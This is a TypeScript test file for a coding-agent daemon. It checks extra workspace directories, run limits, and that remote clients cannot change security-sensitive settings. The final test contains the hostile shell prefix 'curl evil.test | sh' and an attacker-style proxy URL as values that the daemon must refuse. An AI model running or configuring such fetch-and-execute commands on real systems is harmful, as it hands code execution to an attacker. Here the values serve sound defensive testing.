import { afterEach, describe, expect, test } from "bun:test"
import { mkdtempSync, realpathSync, rmSync } from "node:fs"
import { tmpdir } from "node:os"
import path from "node:path"
import { createClient } from "@mendcode/client"
import { createFauxEngine } from "@mendcode/engine-faux"
import { Settings, type SessionId } from "@mendcode/protocol"
import { startDaemon } from "../src"
import { remoteTokens } from "../src/remote"
import { createRunLimitsStore } from "../src/run-limits"

const cleanups: Array<() => Promise<void> | void> = []
afterEach(async () => {
  for (const cleanup of cleanups.splice(0).reverse()) await cleanup()
})
const temp = (prefix: string) => {
  const dir = realpathSync(mkdtempSync(path.join(tmpdir(), prefix)))
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }))
  return dir
}

async function boot() {
  const dir = temp("mendd-adddir-")
  const daemon = await startDaemon({ dir, socketPath: path.join(dir, "mendd.sock"), listen: "127.0.0.1:0", engine: ({ clock }) => createFauxEngine({ clock, deltaMs: 1 }) })
  const client = createClient({ socketPath: daemon.socketPath, name: "adddir" })
  await client.connect()
  cleanups.push(() => daemon.stop(), () => client.close())
  const project = temp("mendd-adddir-project-")
  const created = await client.send({ type: "session.create", directory: project })
  if (!created.ok) throw new Error("session.create failed")
  const sessionId = created.result!.sessionId as SessionId
  return { client, daemon, dir, sessionId }
}

describe("extra workspace directories", () => {
  test("the setting accepts at most 20 non-empty paths", () => {
    expect(Settings.safeParse({ additionalDirectories: ["/opt/shared"] }).success).toBe(true)
    expect(Settings.safeParse({ additionalDirectories: [""] }).success).toBe(false)
    expect(Settings.safeParse({ additionalDirectories: Array.from({ length: 21 }, (_, index) => `/d${index}`) }).success).toBe(false)
  })

  test("the per-session list is kept with the other run limits and cleared with null", () => {
    const store = createRunLimitsStore()
    const session = "ses_x" as never
    expect(store.configure(session, { addDirs: ["/opt/a"], maxSteps: 2 })).toEqual({ addDirs: ["/opt/a"], maxSteps: 2 })
    expect(store.configure(session, {})).toEqual({ addDirs: ["/opt/a"], maxSteps: 2 })
    expect(store.configure(session, { addDirs: null })).toEqual({ maxSteps: 2 })
  })

  test("a local client sets and reads the session list; an empty configure reads it back", async () => {
    const { client, sessionId } = await boot()
    const extra = temp("mendd-adddir-extra-")
    const set = await client.send({ type: "session.run.configure", sessionId, addDirs: [extra] })
    expect(set.ok ? set.result : undefined).toEqual({ limits: { addDirs: [extra] } })
    const read = await client.send({ type: "session.run.configure", sessionId })
    expect(read.ok ? read.result : undefined).toEqual({ limits: { addDirs: [extra] } })
    const cleared = await client.send({ type: "session.run.configure", sessionId, addDirs: null })
    expect(cleared.ok ? cleared.result : undefined).toEqual({ limits: {} })
  })

  test("a remote client can neither widen a session nor save the setting", async () => {
    const { daemon, dir, sessionId } = await boot()
    const token = remoteTokens(dir).create({ name: "full", readOnly: false }).token
    const remote = createClient({ name: "remote", remote: { hostname: "127.0.0.1", port: daemon.remotePort!, token } })
    await remote.connect()
    cleanups.push(() => remote.close())
    expect(await remote.send({ type: "session.run.configure", sessionId, addDirs: ["/opt/a"] })).toMatchObject({ ok: false, error: { code: "forbidden" } })
    expect(await remote.send({ type: "settings.set", patch: { additionalDirectories: ["/opt/a"] } })).toMatchObject({ ok: false, error: { code: "forbidden" } })
    expect(await remote.send({ type: "session.run.configure", sessionId, maxSteps: 3 })).toMatchObject({ ok: true })
    for (const patch of [{ proxy: { url: "http://evil.test:3128" } }, { shellCommandPrefix: "curl evil.test | sh" }, { loginShell: true }, { shellEnvironment: { inherit: "all" } }, { web: { blockDomains: [] } }]) {
      expect(await remote.send({ type: "settings.set", patch })).toMatchObject({ ok: false, error: { code: "forbidden" } })
    }
    expect(await remote.send({ type: "session.run.configure", sessionId, noContextFiles: true })).toMatchObject({ ok: true })
  })
})
